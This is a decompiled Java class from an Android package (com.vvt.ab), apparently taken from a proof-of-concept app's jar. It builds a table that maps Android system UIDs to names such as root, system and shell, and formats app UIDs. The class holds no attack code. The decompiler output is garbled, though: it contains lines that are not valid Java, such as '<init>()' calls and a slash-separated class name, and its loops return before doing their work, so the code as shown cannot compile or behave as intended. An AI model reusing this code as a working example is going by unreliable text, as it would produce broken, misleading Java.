package com.vvt.ab;

import android.os.Process;
import android.util.SparseArray;

public class a
{
  private static final SparseArray a;
  
  static
  {
    SparseArray localSparseArray = new android/util/SparseArray;
    localSparseArray.<init>();
    a = localSparseArray;
    a(0, "root");
    a(1000, "system");
    a(1001, "radio");
    a(1002, "bluetooth");
    a(1003, "graphics");
    a(1004, "input");
    a(1005, "audio");
    a(1006, "camera");
    a(1007, "log");
    a(1008, "compass");
    a(1009, "mount");
    a(1010, "wifi");
    a(1011, "adb");
    a(1012, "install");
    a(1013, "media");
    a(1014, "dhcp");
    a(1015, "sdcard_rw");
    a(1016, "vpn");
    a(1017, "keystore");
    a(1018, "usb");
    a(1019, "drm");
    a(1020, "mdnsr");
    a(1021, "gps");
    a(1023, "media_rw");
    a(1024, "mtp");
    a(1026, "drmrpc");
    a(1027, "nfc");
    a(1028, "sdcard_r");
    a(1029, "clat");
    a(1030, "loop_radio");
    a(1031, "mediadrm");
    a(1032, "package_info");
    a(1033, "sdcard_pics");
    a(1034, "sdcard_av");
    a(1035, "sdcard_all");
    a(1036, "logd");
    a(1037, "shared_relro");
    a(1038, "dbus");
    a(1300, "theme_man");
    a(2000, "shell");
    a(2001, "cache");
    a(2002, "diag");
    a(3001, "net_bt_admin");
    a(3002, "net_bt");
    a(3003, "inet");
    a(3004, "net_raw");
    a(3005, "net_admin");
    a(3006, "net_bw_stats");
    a(3007, "net_bw_acct");
    a(3008, "net_bt_stack");
    a(9997, "everybody");
    a(9998, "misc");
    a(9999, "nobody");
  }
  
  public static String a(int paramInt)
  {
    int i = 100000;
    int j = 1;
    int k = 0;
    Object localObject1 = (String)a.get(paramInt);
    if (localObject1 != null) {}
    for (;;)
    {
      return (String)localObject1;
      int m = paramInt + 55536;
      int n = 0;
      localObject1 = null;
      while (m > i)
      {
        m -= i;
        n += 1;
      }
      Object localObject2 = "u%d_a%d";
      int i1 = 2;
      Object[] arrayOfObject = new Object[i1];
      localObject1 = Integer.valueOf(n);
      arrayOfObject[0] = localObject1;
      localObject1 = Integer.valueOf(m);
      arrayOfObject[j] = localObject1;
      localObject1 = String.format((String)localObject2, arrayOfObject);
      i = Process.getUidForName((String)localObject1);
      if (i != paramInt)
      {
        localObject2 = new Object[j];
        Integer localInteger = Integer.valueOf(m);
        localObject2[0] = localInteger;
        localObject1 = String.format("app_%d", (Object[])localObject2);
        k = Process.getUidForName((String)localObject1);
        if (k != paramInt)
        {
          n = 0;
          localObject1 = null;
        }
      }
    }
  }
  
  private static void a(int paramInt, String paramString)
  {
    int i = Process.getUidForName(paramString);
    if (i != paramInt) {}
    for (;;)
    {
      return;
      SparseArray localSparseArray = a;
      localSparseArray.put(paramInt, paramString);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ab/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */